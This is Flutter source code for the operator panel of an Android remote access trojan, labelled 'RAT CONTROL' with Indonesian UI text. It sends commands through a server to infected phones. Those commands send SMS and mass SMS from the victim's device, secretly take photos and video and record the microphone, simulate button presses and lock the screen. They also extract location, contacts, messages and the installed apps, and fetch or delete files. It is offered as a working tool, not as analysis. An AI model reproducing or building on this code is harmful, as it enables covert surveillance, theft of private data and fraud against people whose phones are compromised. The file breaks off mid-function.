// ignore_for_file: use_build_context_synchronously
import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;

// ============================================================
//  CONSTANTS
// ============================================================
const String _kBaseUrl = 'https://YOUR_SERVER_URL'; // Ganti dengan URL server kamu

const Color _kGreen = Color(0xFF25D366);
const Color _kGreenDark = Color(0xFF102016);
const Color _kGreenBorder = Color(0xFF20402E);
const Color _kBg = Color(0xFF000000);
const Color _kBgCard = Color(0xFF0A0D0B);
const Color _kBgCard2 = Color(0xFF121413);
const Color _kGray = Color(0xFFE0E0E0);
const Color _kGrayDim = Color(0xFF1E1E1E);

// ============================================================
//  RAT PAGE
// ============================================================
class RatPage extends StatefulWidget {
  final String apiKey; // adminId sebagai x-api-key

  const RatPage({super.key, required this.apiKey});

  @override
  State<RatPage> createState() => _RatPageState();
}

class _RatPageState extends State<RatPage> with TickerProviderStateMixin {
  late AnimationController _fadeCtrl;
  late Animation<double> _fadeAnim;

  List<Map<String, dynamic>> _devices = [];
  bool _isLoadingDevices = false;
  Map<String, dynamic>? _selectedDevice;

  // Tab controller untuk panel kanan
  late TabController _tabCtrl;

  // State per-fitur
  bool _isSending = false;
  String _lastResult = '';

  // Controller teks
  final _smsNumberCtrl = TextEditingController();
  final _smsMessageCtrl = TextEditingController();
  final _notifTitleCtrl = TextEditingController();
  final _notifLinkCtrl = TextEditingController();
  final _toastMsgCtrl = TextEditingController();
  final _ttsMsgCtrl = TextEditingController();
  final _ttsLangCtrl = TextEditingController(text: 'id');
  final _linkUrlCtrl = TextEditingController();
  final _micDurationCtrl = TextEditingController(text: '10');
  final _camDurationCtrl = TextEditingController();
  final _filePathCtrl = TextEditingController();
  final _audioUrlCtrl = TextEditingController();
  final _broadcastCmdCtrl = TextEditingController();
  final _broadcastPayloadCtrl = TextEditingController();

  String _selectedCamType = 'main';
  String _selectedButton = 'home';

  @override
  void initState() {
    super.initState();
    _fadeCtrl = AnimationController(
      duration: const Duration(milliseconds: 400),
      vsync: this,
    );
    _fadeAnim = CurvedAnimation(parent: _fadeCtrl, curve: Curves.easeInOut);
    _fadeCtrl.forward();

    _tabCtrl = TabController(length: 5, vsync: this);
    _fetchDevices();
  }

  @override
  void dispose() {
    _fadeCtrl.dispose();
    _tabCtrl.dispose();
    _smsNumberCtrl.dispose();
    _smsMessageCtrl.dispose();
    _notifTitleCtrl.dispose();
    _notifLinkCtrl.dispose();
    _toastMsgCtrl.dispose();
    _ttsMsgCtrl.dispose();
    _ttsLangCtrl.dispose();
    _linkUrlCtrl.dispose();
    _micDurationCtrl.dispose();
    _camDurationCtrl.dispose();
    _filePathCtrl.dispose();
    _audioUrlCtrl.dispose();
    _broadcastCmdCtrl.dispose();
    _broadcastPayloadCtrl.dispose();
    super.dispose();
  }

  // ============================================================
  //  API CALLS
  // ============================================================
  Map<String, String> get _headers => {
        'Content-Type': 'application/json',
        'x-api-key': widget.apiKey,
      };

  Future<void> _fetchDevices() async {
    setState(() => _isLoadingDevices = true);
    try {
      final res = await http.get(
        Uri.parse('$_kBaseUrl/api/devices'),
        headers: _headers,
      );
      final data = jsonDecode(res.body);
      if (data['success'] == true) {
        setState(() {
          _devices = List<Map<String, dynamic>>.from(data['devices'] ?? []);
          // Auto-select first device
          if (_devices.isNotEmpty && _selectedDevice == null) {
            _selectedDevice = _devices.first;
          }
        });
      }
    } catch (e) {
      _showSnack('Gagal fetch devices: $e', isError: true);
    } finally {
      setState(() => _isLoadingDevices = false);
    }
  }

  Future<void> _sendCommand(String command, {String? payload}) async {
    if (_selectedDevice == null) {
      _showSnack('Pilih device terlebih dahulu!', isError: true);
      return;
    }
    setState(() {
      _isSending = true;
      _lastResult = '';
    });
    try {
      final body = {
        'uuid': _selectedDevice!['uuid'],
        'command': command,
        if (payload != null && payload.isNotEmpty) 'payload': payload,
      };
      final res = await http.post(
        Uri.parse('$_kBaseUrl/api/command'),
        headers: _headers,
        body: jsonEncode(body),
      );
      final data = jsonDecode(res.body);
      setState(() => _lastResult = data['success'] == true ? '✓ Command sent: ${data['command']}' : '✗ ${data['message']}');
      _showSnack(_lastResult, isError: data['success'] != true);
    } catch (e) {
      setState(() => _lastResult = '✗ Error: $e');
      _showSnack(_lastResult, isError: true);
    } finally {
      setState(() => _isSending = false);
    }
  }

  Future<void> _sendSms() async {
    if (_selectedDevice == null) return _showSnack('Pilih device!', isError: true);
    setState(() => _isSending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBaseUrl/api/sms'),
        headers: _headers,
        body: jsonEncode({
          'uuid': _selectedDevice!['uuid'],
          'number': _smsNumberCtrl.text,
          'message': _smsMessageCtrl.text,
        }),
      );
      final data = jsonDecode(res.body);
      _showSnack(data['success'] == true ? '✓ SMS terkirim' : '✗ ${data['message']}',
          isError: data['success'] != true);
    } catch (e) {
      _showSnack('✗ Error: $e', isError: true);
    } finally {
      setState(() => _isSending = false);
    }
  }

  Future<void> _sendSmsBroadcast() async {
    if (_selectedDevice == null) return _showSnack('Pilih device!', isError: true);
    setState(() => _isSending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBaseUrl/api/sms/broadcast'),
        headers: _headers,
        body: jsonEncode({
          'uuid': _selectedDevice!['uuid'],
          'message': _smsMessageCtrl.text,
        }),
      );
      final data = jsonDecode(res.body);
      _showSnack(data['success'] == true ? '✓ Broadcast SMS terkirim' : '✗ ${data['message']}',
          isError: data['success'] != true);
    } catch (e) {
      _showSnack('✗ Error: $e', isError: true);
    } finally {
      setState(() => _isSending = false);
    }
  }

  Future<void> _sendNotification() async {
    if (_selectedDevice == null) return _showSnack('Pilih device!', isError: true);
    setState(() => _isSending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBaseUrl/api/notification'),
        headers: _headers,
        body: jsonEncode({
          'uuid': _selectedDevice!['uuid'],
          'title': _notifTitleCtrl.text,
          'link': _notifLinkCtrl.text,
        }),
      );
      final data = jsonDecode(res.body);
      _showSnack(data['success'] == true ? '✓ Notifikasi terkirim' : '✗ ${data['message']}',
          isError: data['success'] != true);
    } catch (e) {
      _showSnack('✗ Error: $e', isError: true);
    } finally {
      setState(() => _isSending = false);
    }
  }

  Future<void> _sendBroadcast() async {
    setState(() => _isSending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBaseUrl/api/command/broadcast'),
        headers: _headers,
        body: jsonEncode({
          'command': _broadcastCmdCtrl.text,
          if (_broadcastPayloadCtrl.text.isNotEmpty) 'payload': _broadcastPayloadCtrl.text,
        }),
      );
      final data = jsonDecode(res.body);
      _showSnack(data['success'] == true
          ? '✓ Broadcast ke ${data['sent']} device'
          : '✗ ${data['message']}',
          isError: data['success'] != true);
    } catch (e) {
      _showSnack('✗ Error: $e', isError: true);
    } finally {
      setState(() => _isSending = false);
    }
  }

  Future<void> _sendCamera() async {
    if (_selectedDevice == null) return _showSnack('Pilih device!', isError: true);
    setState(() => _isSending = true);
    try {
      final body = {
        'uuid': _selectedDevice!['uuid'],
        'type': _selectedCamType,
        if (_camDurationCtrl.text.isNotEmpty) 'duration': _camDurationCtrl.text,
      };
      final res = await http.post(
        Uri.parse('$_kBaseUrl/api/camera'),
        headers: _headers,
        body: jsonEncode(body),
      );
      final data = jsonDecode(res.body);
      _showSnack(data['success'] == true ? '✓ Camera command sent' : '✗ ${data['message']}',
          isError: data['success'] != true);
    } catch (e) {
      _showSnack('✗ Error: $e', isError: true);
    } finally {
      setState(() => _isSending = false);
    }
  }

  Future<void> _deleteFile() async {
    if (_selectedDevice == null) return _showSnack('Pilih device!', isError: true);
    setState(() => _isSending = true);
    try {
      final res = await http.delete(
        Uri.parse('$_kBaseUrl/api/file'),
        headers: _headers,
        body: jsonEncode({'uuid': _selectedDevice!['uuid'], 'path': _filePathCtrl.text}),
      );
      final data = jsonDecode(res.body);
      _showSnack(data['success'] == true ? '✓ File dihapus' : '✗ ${data['message']}',
          isError: data['success'] != true);
    } catch (e) {
      _showSnack('✗ Error: $e', isError: true);
    } finally {
      setState(() => _isSending = false);
    }
  }

  void _showSnack(String msg, {bool isError = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(
          msg,
          style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white),
        ),
        backgroundColor: isError ? Colors.red.withOpacity(0.85) : _kGreen.withOpacity(0.85),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        duration: const Duration(seconds: 3),
      ),
    );
  }

  // ============================================================
  //  BUILD
  // ============================================================
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _kBg,
      body: FadeTransition(
        opacity: _fadeAnim,
        child: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              _buildDeviceSelector(),
              if (_selectedDevice != null) _buildDeviceInfoBar(),
              Expanded(child: _buildBody()),
            ],
          ),
        ),
      ),
    );
  }

  // ──────────────────────────────────────────────
  //  HEADER
  // ──────────────────────────────────────────────
  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      decoration: BoxDecoration(
        color: _kBgCard,
        border: Border(
          bottom: BorderSide(color: _kGreen.withOpacity(0.2), width: 1),
        ),
      ),
      child: Row(
        children: [
          // Back
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: _kGreenDark,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _kGreen.withOpacity(0.4)),
              ),
              child: const Icon(Icons.arrow_back_ios_new, color: _kGreen, size: 16),
            ),
          ),
          const SizedBox(width: 14),

          // Icon
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: _kGreenDark,
              border: Border.all(color: _kGreen.withOpacity(0.5)),
            ),
            child: const Icon(Icons.phone_android, color: _kGreen, size: 18),
          ),
          const SizedBox(width: 12),

          // Title
          const Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                'RAT CONTROL',
                style: TextStyle(
                  color: _kGray,
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Orbitron',
                  letterSpacing: 2,
                ),
              ),
              Text(
                'Remote Access Terminal',
                style: TextStyle(
                  color: Colors.white38,
                  fontSize: 10,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 1,
                ),
              ),
            ],
          ),

          const Spacer(),

          // Refresh
          GestureDetector(
            onTap: _fetchDevices,
            child: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.05),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: Colors.white12),
              ),
              child: _isLoadingDevices
                  ? const SizedBox(
                      width: 16,
                      height: 16,
                      child: CircularProgressIndicator(color: _kGreen, strokeWidth: 2),
                    )
                  : const Icon(Icons.refresh, color: Colors.white54, size: 18),
            ),
          ),
        ],
      ),
    );
  }

  // ──────────────────────────────────────────────
  //  DEVICE SELECTOR
  // ──────────────────────────────────────────────
  Widget _buildDeviceSelector() {
    return Container(
      height: 110,
      color: Colors.black,
      child: _isLoadingDevices
          ? const Center(child: CircularProgressIndicator(color: _kGreen, strokeWidth: 2))
          : _devices.isEmpty
              ? Center(
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Icon(Icons.signal_wifi_off, color: Colors.white24, size: 28),
                      const SizedBox(height: 6),
                      const Text('Tidak ada device online',
                          style: TextStyle(color: Colors.white30, fontFamily: 'ShareTechMono', fontSize: 12)),
                    ],
                  ),
                )
              : ListView.builder(
                  scrollDirection: Axis.horizontal,
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 12),
                  itemCount: _devices.length,
                  itemBuilder: (_, i) => _buildDeviceCard(_devices[i]),
                ),
    );
  }

  Widget _buildDeviceCard(Map<String, dynamic> device) {
    final bool isSelected = _selectedDevice?['uuid'] == device['uuid'];
    return GestureDetector(
      onTap: () => setState(() => _selectedDevice = device),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        width: 150,
        margin: const EdgeInsets.only(right: 10),
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          color: isSelected ? _kGreenDark : _kBgCard2,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: isSelected ? _kGreen : Colors.white12,
            width: isSelected ? 1.5 : 1,
          ),
          boxShadow: isSelected
              ? [BoxShadow(color: _kGreen.withOpacity(0.2), blurRadius: 12, spreadRadius: 1)]
              : [],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(Icons.phone_android,
                    color: isSelected ? _kGreen : Colors.white54, size: 14),
                const SizedBox(width: 6),
                Expanded(
                  child: Text(
                    device['model'] ?? 'Unknown',
                    style: TextStyle(
                      color: isSelected ? Colors.white : Colors.white70,
                      fontSize: 11,
                      fontFamily: 'ShareTechMono',
                      fontWeight: FontWeight.bold,
                    ),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                ),
                if (isSelected)
                  Container(
                    width: 6,
                    height: 6,
                    decoration: const BoxDecoration(color: _kGreen, shape: BoxShape.circle),
                  ),
              ],
            ),
            const SizedBox(height: 6),
            _miniInfo(Icons.battery_5_bar, device['battery'] ?? '?', isSelected),
            const SizedBox(height: 3),
            _miniInfo(Icons.signal_cellular_alt, device['provider'] ?? '?', isSelected),
          ],
        ),
      ),
    );
  }

  Widget _miniInfo(IconData icon, String val, bool active) {
    return Row(
      children: [
        Icon(icon, size: 10, color: active ? Colors.white54 : Colors.white30),
        const SizedBox(width: 4),
        Flexible(
          child: Text(
            val,
            style: TextStyle(
              fontSize: 9,
              color: active ? Colors.white54 : Colors.white30,
              fontFamily: 'ShareTechMono',
            ),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
        ),
      ],
    );
  }

  // ──────────────────────────────────────────────
  //  DEVICE INFO BAR
  // ──────────────────────────────────────────────
  Widget _buildDeviceInfoBar() {
    final d = _selectedDevice!;
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      color: _kGreenDark,
      child: Row(
        children: [
          const Icon(Icons.circle, color: _kGreen, size: 8),
          const SizedBox(width: 8),
          Text(
            '${d['model'] ?? '?'} • ${d['provider'] ?? '?'} • Batt: ${d['battery'] ?? '?'} • OS: ${d['version'] ?? '?'} • Bright: ${d['brightness'] ?? '?'}',
            style: const TextStyle(
              color: _kGreen,
              fontSize: 10,
              fontFamily: 'ShareTechMono',
              letterSpacing: 0.8,
            ),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
          const Spacer(),
          GestureDetector(
            onTap: () {
              Clipboard.setData(ClipboardData(text: d['uuid'] ?? ''));
              _showSnack('UUID copied!');
            },
            child: const Icon(Icons.copy, color: Colors.white38, size: 14),
          ),
        ],
      ),
    );
  }

  // ──────────────────────────────────────────────
  //  MAIN BODY — TAB LAYOUT
  // ──────────────────────────────────────────────
  Widget _buildBody() {
    return Column(
      children: [
        // Tab Bar
        Container(
          color: _kBgCard,
          child: TabBar(
            controller: _tabCtrl,
            isScrollable: true,
            indicatorColor: _kGreen,
            indicatorWeight: 2,
            labelColor: _kGreen,
            unselectedLabelColor: Colors.white38,
            labelStyle: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, letterSpacing: 1),
            unselectedLabelStyle: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11),
            tabs: const [
              Tab(icon: Icon(Icons.sms, size: 16), text: 'SMS'),
              Tab(icon: Icon(Icons.campaign, size: 16), text: 'Notif'),
              Tab(icon: Icon(Icons.videocam, size: 16), text: 'Media'),
              Tab(icon: Icon(Icons.touch_app, size: 16), text: 'Control'),
              Tab(icon: Icon(Icons.folder, size: 16), text: 'File'),
            ],
          ),
        ),

        // Tab Views
        Expanded(
          child: TabBarView(
            controller: _tabCtrl,
            children: [
              _buildSmsTab(),
              _buildNotifTab(),
              _buildMediaTab(),
              _buildControlTab(),
              _buildFileTab(),
            ],
          ),
        ),
      ],
    );
  }

  // ──────────────────────────────────────────────
  //  TAB 1: SMS
  // ──────────────────────────────────────────────
  Widget _buildSmsTab() {
    return _tabScroll([
      _sectionTitle('KIRIM SMS', FontAwesomeIcons.commentSms),
      _inputField('Nomor Tujuan', _smsNumberCtrl, hint: '+628xx...', keyboardType: TextInputType.phone),
      _inputField('Pesan', _smsMessageCtrl, hint: 'Tulis pesan...', maxLines: 3),
      const SizedBox(height: 8),
      Row(
        children: [
          Expanded(
            child: _actionButton(
              label: 'Kirim ke Nomor',
              icon: Icons.send,
              onTap: _sendSms,
            ),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: _actionButton(
              label: 'Broadcast Semua',
              icon: Icons.send_to_mobile,
              onTap: _sendSmsBroadcast,
              color: Colors.orange,
            ),
          ),
        ],
      ),

      const SizedBox(height: 24),
      _sectionTitle('BROADCAST COMMAND', Icons.wifi_tethering),
      _inputField('Command', _broadcastCmdCtrl, hint: 'e.g. ping'),
      _inputField('Payload (opsional)', _broadcastPayloadCtrl, hint: 'optional payload'),
      _actionButton(
        label: 'Broadcast ke Semua Device',
        icon: Icons.broadcast_on_personal,
        onTap: _sendBroadcast,
        color: Colors.redAccent,
        fullWidth: true,
      ),
    ]);
  }

  // ──────────────────────────────────────────────
  //  TAB 2: NOTIF / TOAST / TTS / LINK / AUDIO
  // ──────────────────────────────────────────────
  Widget _buildNotifTab() {
    return _tabScroll([
      _sectionTitle('NOTIFIKASI', Icons.notifications_active),
      _inputField('Judul Notif', _notifTitleCtrl, hint: 'Masukkan judul...'),
      _inputField('Link/URL', _notifLinkCtrl, hint: 'https://...'),
      _actionButton(label: 'Kirim Notifikasi', icon: Icons.notification_add, onTap: _sendNotification, fullWidth: true),

      const SizedBox(height: 20),
      _sectionTitle('TOAST MESSAGE', Icons.chat_bubble_outline),
      _inputField('Pesan Toast', _toastMsgCtrl, hint: 'Pesan singkat...'),
      _actionButton(
          label: 'Kirim Toast',
          icon: Icons.send,
          onTap: () => _sendCommand('toast', payload: _toastMsgCtrl.text),
          fullWidth: true),

      const SizedBox(height: 20),
      _sectionTitle('TEXT TO SPEECH', Icons.record_voice_over),
      _inputField('Teks TTS', _ttsMsgCtrl, hint: 'Teks yang akan dibacakan...', maxLines: 2),
      _inputField('Bahasa', _ttsLangCtrl, hint: 'id / en / etc'),
      _actionButton(
          label: 'Jalankan TTS',
          icon: Icons.volume_up,
          onTap: () async {
            if (_selectedDevice == null) return _showSnack('Pilih device!', isError: true);
            setState(() => _isSending = true);
            try {
              final res = await http.post(
                Uri.parse('$_kBaseUrl/api/tts'),
                headers: _headers,
                body: jsonEncode({
                  'uuid': _selectedDevice!['uuid'],
                  'text': _ttsMsgCtrl.text,
                  'lang': _ttsLangCtrl.text.isEmpty ? 'id' : _ttsLangCtrl.text,
                }),
              );
              final data = jsonDecode(res.body);
              _showSnack(data['success'] == true ? '✓ TTS dijalankan' : '✗ ${data['message']}',
                  isError: data['success'] != true);
            } catch (e) {
              _showSnack('✗ $e', isError: true);
            } finally {
              setState(() => _isSending = false);
            }
          },
          fullWidth: true),

      const SizedBox(height: 20),
      _sectionTitle('BUKA LINK', Icons.open_in_browser),
      _inputField('URL Target', _linkUrlCtrl, hint: 'https://...'),
      _actionButton(
          label: 'Buka di Device',
          icon: Icons.launch,
          onTap: () => _sendCommand('open_target_link', payload: _linkUrlCtrl.text),
          fullWidth: true),

      const SizedBox(height: 20),
      _sectionTitle('PLAY AUDIO', Icons.music_note),
      _inputField('URL Audio', _audioUrlCtrl, hint: 'https://.../audio.mp3'),
      _actionButton(
          label: 'Play Audio di Device',
          icon: Icons.play_arrow,
          onTap: () async {
            if (_selectedDevice == null) return _showSnack('Pilih device!', isError: true);
            setState(() => _isSending = true);
            try {
              final res = await http.post(
                Uri.parse('$_kBaseUrl/api/audio'),
                headers: _headers,
                body: jsonEncode({'uuid': _selectedDevice!['uuid'], 'url': _audioUrlCtrl.text}),
              );
              final data = jsonDecode(res.body);
              _showSnack(data['success'] == true ? '✓ Audio diputar' : '✗ ${data['message']}',
                  isError: data['success'] != true);
            } catch (e) {
              _showSnack('✗ $e', isError: true);
            } finally {
              setState(() => _isSending = false);
            }
          },
          fullWidth: true),
    ]);
  }

  // ──────────────────────────────────────────────
  //  TAB 3: MEDIA (CAM / MIC)
  // ──────────────────────────────────────────────
  Widget _buildMediaTab() {
    return _tabScroll([
      _sectionTitle('KAMERA', Icons.camera_alt),
      // Camera type toggle
      Container(
        margin: const EdgeInsets.only(bottom: 12),
        decoration: BoxDecoration(
          color: _kBgCard2,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: Colors.white12),
        ),
        child: Row(
          children: ['main', 'selfie'].map((type) {
            final bool active = _selectedCamType == type;
            return Expanded(
              child: GestureDetector(
                onTap: () => setState(() => _selectedCamType = type),
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 200),
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  decoration: BoxDecoration(
                    color: active ? _kGreenDark : Colors.transparent,
                    borderRadius: BorderRadius.circular(12),
                    border: active ? Border.all(color: _kGreen.withOpacity(0.5)) : null,
                  ),
                  child: Text(
                    type == 'main' ? '📷 Main Cam' : '🤳 Selfie',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                      color: active ? _kGreen : Colors.white54,
                      fontFamily: 'ShareTechMono',
                      fontSize: 12,
                      fontWeight: active ? FontWeight.bold : FontWeight.normal,
                    ),
                  ),
                ),
              ),
            );
          }).toList(),
        ),
      ),
      _inputField('Durasi Rekam (detik, kosongkan=foto)', _camDurationCtrl,
          hint: 'e.g. 10', keyboardType: TextInputType.number),
      Row(
        children: [
          Expanded(
            child: _actionButton(
              label: 'Foto / Rekam',
              icon: Icons.camera,
              onTap: _sendCamera,
            ),
          ),
        ],
      ),

      const SizedBox(height: 24),
      _sectionTitle('MIKROFON', FontAwesomeIcons.microphone),
      _inputField('Durasi (detik)', _micDurationCtrl, hint: '10', keyboardType: TextInputType.number),
      _actionButton(
          label: 'Rekam Mikrofon',
          icon: Icons.mic,
          onTap: () async {
            if (_selectedDevice == null) return _showSnack('Pilih device!', isError: true);
            setState(() => _isSending = true);
            try {
              final res = await http.post(
                Uri.parse('$_kBaseUrl/api/microphone'),
                headers: _headers,
                body: jsonEncode({'uuid': _selectedDevice!['uuid'], 'duration': _micDurationCtrl.text}),
              );
              final data = jsonDecode(res.body);
              _showSnack(data['success'] == true ? '✓ Mikrofon aktif' : '✗ ${data['message']}',
                  isError: data['success'] != true);
            } catch (e) {
              _showSnack('✗ $e', isError: true);
            } finally {
              setState(() => _isSending = false);
            }
          },
          fullWidth: true,
          color: Colors.redAccent),
    ]);
  }

  // ──────────────────────────────────────────────
  //  TAB 4: CONTROL (BUTTON)
  // ──────────────────────────────────────────────
  Widget _buildControlTab() {
    final buttons = [
      {'key': 'home', 'label': 'Home', 'icon': Icons.home},
      {'key': 'back', 'label': 'Back', 'icon': Icons.arrow_back},
      {'key': 'recent', 'label': 'Recent', 'icon': Icons.view_carousel},
      {'key': 'vol_up', 'label': 'Vol +', 'icon': Icons.volume_up},
      {'key': 'vol_down', 'label': 'Vol -', 'icon': Icons.volume_down},
      {'key': 'power', 'label': 'Power', 'icon': Icons.power_settings_new},
    ];

    return _tabScroll([
      _sectionTitle('TOMBOL PERANGKAT', Icons.touch_app),
      const Text(
        'Simulasikan penekanan tombol fisik/virtual di device target.',
        style: TextStyle(color: Colors.white38, fontFamily: 'ShareTechMono', fontSize: 11, height: 1.5),
      ),
      const SizedBox(height: 16),
      GridView.builder(
        shrinkWrap: true,
        physics: const NeverScrollableScrollPhysics(),
        itemCount: buttons.length,
        gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
          crossAxisCount: 3,
          childAspectRatio: 1.2,
          crossAxisSpacing: 10,
          mainAxisSpacing: 10,
        ),
        itemBuilder: (_, i) {
          final btn = buttons[i];
          final bool isPower = btn['key'] == 'power';
          return GestureDetector(
            onTap: () async {
              if (_selectedDevice == null) return _showSnack('Pilih device!', isError: true);
              setState(() => _isSending = true);
              try {
                final res = await http.post(
                  Uri.parse('$_kBaseUrl/api/button'),
                  headers: _headers,
                  body: jsonEncode({'uuid': _selectedDevice!['uuid'], 'button': btn['key']}),
                );
                final data = jsonDecode(res.body);
                _showSnack(data['success'] == true ? '✓ ${btn['label']} pressed' : '✗ ${data['message']}',
                    isError: data['success'] != true);
              } catch (e) {
                _showSnack('✗ $e', isError: true);
              } finally {
                setState(() => _isSending = false);
              }
            },
            child: Container(
              decoration: BoxDecoration(
                color: isPower ? Colors.red.withOpacity(0.12) : _kBgCard2,
                borderRadius: BorderRadius.circular(14),
                border: Border.all(
                  color: isPower ? Colors.red.withOpacity(0.4) : Colors.white12,
                ),
              ),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(btn['icon'] as IconData,
                      color: isPower ? Colors.redAccent : Colors.white70, size: 26),
                  const SizedBox(height: 6),
                  Text(
                    btn['label'] as String,
                    style: TextStyle(
                      color: isPower ? Colors.redAccent : Colors.white60,
                      fontFamily: 'ShareTechMono',
                      fontSize: 11,
                    ),
                  ),
                ],
              ),
            ),
          );
        },
      ),

      const SizedBox(height: 24),
      _sectionTitle('CUSTOM COMMAND', Icons.terminal),
      _buildQuickCommands(),
    ]);
  }

  Widget _buildQuickCommands() {
    final cmds = [
      {'label': 'Get Location', 'cmd': 'get_location', 'payload': null, 'color': Colors.blue},
      {'label': 'Get Contacts', 'cmd': 'get_contacts', 'payload': null, 'color': Colors.teal},
      {'label': 'Get SMS', 'cmd': 'get_messages', 'payload': null, 'color': Colors.purple},
      {'label': 'Get Installed Apps', 'cmd': 'get_installed_apps', 'payload': null, 'color': Colors.orange},
      {'label': 'Lock Screen', 'cmd': 'lock_screen', 'payload': null, 'color': Colors.redAccent},
      {'label': 'Vibrate', 'cmd': 'vibrate', 'payload': null, 'color': Colors.amber},
    ];

    return Column(
      children: cmds.map((c) {
        final Color col = c['color'] as Color;
        return GestureDetector(
          onTap: () => _sendCommand(c['cmd'] as String,
              payload: c['payload'] as String?),
          child: Container(
            margin: const EdgeInsets.only(bottom: 8),
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
            decoration: BoxDecoration(
              color: col.withOpacity(0.07),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: col.withOpacity(0.25)),
            ),
            child: Row(
              children: [
                Container(
                  width: 8,
                  height: 8,
                  decoration: BoxDecoration(color: col, shape: BoxShape.circle),
                ),
                const SizedBox(width: 14),
                Text(
                  c['label'] as String,
                  style: TextStyle(
                    color: col,
                    fontFamily: 'ShareTechMono',
                    fontSize: 13,
                    fontWeight: FontWeight.w600,
                  ),
                ),
                const Spacer(),
                Icon(Icons.chevron_right, color: col.withOpacity(0.5), size: 18),
              ],
            ),
          ),
        );
      }).toList(),
    );
  }

  // ──────────────────────────────────────────────
  //  TAB 5: FILE
  // ──────────────────────────────────────────────
  Widget _buildFileTab() {
    return _tabScroll([
      _sectionTitle('FILE MANAGER', Icons.folder_open),
      _inputField('Path File di Device', _filePathCtrl,
          hint: '/storage/emulated/0/...'),
      Row(
        children: [
          Expanded(
            child: _actionButton(
              label: 'Get File',
              icon: Icons.download,
              onTap: () => _sendCommand('file', payload: _filePathCtrl.text),
            ),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: _actionButton(
              label: 'Hapus File',
              icon: Icons.delete_forever,
              onTap: _deleteFile,
              color: Colors.redAccent,
            ),
          ),
        ],
      ),

      const SizedBox(height: 24),
      _sectionTitle('SERVER FILES', Icons.cloud),
      _buildServerFilesSection(),
    ]);
  }

  Widget _buildServerFilesSection() {
    return FutureBuilder<List<Map<String, dynamic>>>(
      future: _fetchServerFiles(),
      builder: (context, snap) {
        if (snap.connectionState == ConnectionState.waiting) {
          return const Center(
            child: Padding(
              padding: EdgeInsets.all(24),
              child: CircularProgressIndicator(color: _kGreen, strokeWidth: 2),
            ),
          );
        }
        final files = snap.data ?? [];
        if (files.isEmpty) {
          return Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: _kBgCard2,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: Colors.white12),
            ),
            child: const Center(
              child: Text('Tidak ada file di server',
                  style: TextStyle(color: Colors.white38, fontFamily: 'ShareTechMono')),
            ),
          );
        }
        return Column(
          children: files.map((f) {
            return Container(
              margin: const EdgeInsets.only(bottom: 8),
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
              decoration: BoxDecoration(
                color: _kBgCard2,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.white.withOpacity(0.05)),
              ),
              child: Row(
                children: [
                  const Icon(Icons.insert_drive_file, color: Colors.white38, size: 18),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          f['name'] ?? '',
                          style: const TextStyle(
                            color: Colors.white70,
                            fontFamily: 'ShareTechMono',
                            fontSize: 12,
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                        Text(
                          f['url'] ?? '',
                          style: const TextStyle(
                            color: Colors.white30,
                            fontFamily: 'ShareTechMono',
                            fontSize: 9,
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                      ],
                    ),
                  ),
                  IconButton(
                    icon: const Icon(Icons.copy, color: Colors.white38, size: 16),
                    onPressed: () {
                      Clipboard.setData(ClipboardData(text: f['url'] ?? ''));
